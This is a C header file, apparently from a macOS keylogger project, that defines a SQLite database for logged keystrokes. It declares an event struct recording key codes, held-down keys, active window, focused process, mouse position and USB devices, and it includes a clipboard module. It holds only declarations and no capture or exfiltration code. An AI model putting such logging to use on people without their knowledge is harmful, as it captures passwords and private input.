#pragma once
#define DEBUG_FLAGS    (SQLDBAL_FLAG_DEBUG | SQLDBAL_FLAG_SQLITE_OPEN_CREATE | SQLDBAL_FLAG_SQLITE_OPEN_READWRITE)
#define _FLAGS         (SQLDBAL_FLAG_SQLITE_OPEN_CREATE | SQLDBAL_FLAG_SQLITE_OPEN_READWRITE)
#define FLAGS          _FLAGS
#define INSERT_QTY     10
#define LOCATION       "keylogger-db.sqlite"
#ifndef SQLDBAL_SQLITE
#define SQLDBAL_SQLITE
#endif
//////////////////////////////////////
#include <ctype.h>
#include <inttypes.h>
#include <math.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
//////////////////////////////////////
#include "active-app/active-app.h"
#include "app-utils/app-utils.h"
#include "bytes/bytes.h"
#include "c_ansi/ansi-codes/ansi-codes.h"
#include "c_ansi/ansi-utils/ansi-utils.h"
#include "c_eventemitter/include/eventemitter.h"
#include "c_forever/include/forever.h"
#include "c_string_buffer/include/stringbuffer.h"
#include "c_stringfn/include/stringfn.h"
#include "c_vector/vector/vector.h"
#include "catpath/catpath.h"
#include "hidapi/hidapi/hidapi.h"
#include "hidapi/mac/hidapi_darwin.h"
#include "int/int.h"
#include "keylogger/keylogger.h"
#include "libusb/libusb/libusb.h"
#include "libusb/libusb/os/darwin_usb.h"
#include "log.h/log.h"
#include "pbpaste/pbpaste.h"
#include "process/process.h"
#include "sqldbal/src/sqldbal.h"
#include "submodules/b64.c/b64.h"
#include "timestamp/timestamp.h"
#include "window-utils/window-utils.h"
//////////////////////////////////////////
typedef struct DB_STATEMENT_T {
  enum sqldbal_status_code rc;
  struct sqldbal_stmt      *stmt;
  int64_t                  qty;
  int64_t                  inserted_id;
} db_statement_t;
typedef struct logged_key_event_t {
  unsigned long  ts, qty;
  int            active_window_id, focused_pid;
  unsigned long  event_flags;
  char           *event_flag;
  unsigned long  key_code;
  char           *key_string, *action, *input_type;
  unsigned long  mouse_x, mouse_y;
  struct Vector  *downkeys_v;
  struct djbhash *downkeys_h;
  char           *downkeys_csv;
  ssize_t        usb_devices_qty;
  struct Vector  *usb_devices_v;
} logged_key_event_t;
struct MouseEvent {
  CGFloat     x;
  CGFloat     y;
  CGEventType type;
};
//////////////////////////////////////////
int keylogger_db_delete(void);
int keylogger_create_db(void);
int keylogger_init_db(void);
int keylogger_select_db(void);
int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT);
int keylogger_insert_db_window_row();
int keylogger_close_db(void);
int keylogger_db_lifecycle(void);
size_t keylogger_count_table_rows(const char *TABLE_NAME);
